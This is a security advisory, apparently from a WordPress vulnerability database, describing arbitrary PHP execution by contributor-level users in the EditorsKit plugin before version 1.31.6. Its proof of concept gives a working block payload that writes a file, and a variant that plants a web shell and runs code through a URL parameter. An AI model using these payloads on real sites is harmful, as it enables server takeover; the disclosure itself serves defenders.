## WordPress Plugin Vulnerabilities

# EditorsKit < 1.31.6 - Contributor+ Arbitrary PHP Code Execution

### Description

The plugin does not sanitise and validate the Conditional Logic of the Custom Visibility settings, allowing users with a role as low contributor to execute Arbitrary PHP code

### Proof of Concept

As a contributor, create/edit a post and put the below code while in Code Editor mode:
<!-- wp:paragraph {"editorskit":{"logic":"file\_put\_contents('/var/www/hacked.txt', 'hacked')","devices":false,"desktop":true,"tablet":true,"mobile":true,"loggedin":true,"loggedout":true,"acf\_visibility":"","acf\_field":"","acf\_condition":"","acf\_value":"","migrated":false,"unit\_test":false}} -->\n<p>aa</p>\n<!-- /wp:paragraph -->
Save or Preview the page, which will create the /var/www/hacked.txt file
(WPscanTeam) To create a shell:
- Payload: file\_put\_contents('/var/www/hacked.php', wp\_unslash($\_GET['c']))
- View/preview the post and add &c=<?php echo 'failed'; ?> e.g: https://example.com/?p=1079&preview=true&c=%3C?php%20echo%20%27Failed%27;%20?%3E
- Access https://example.com/hacked.php to execute the code
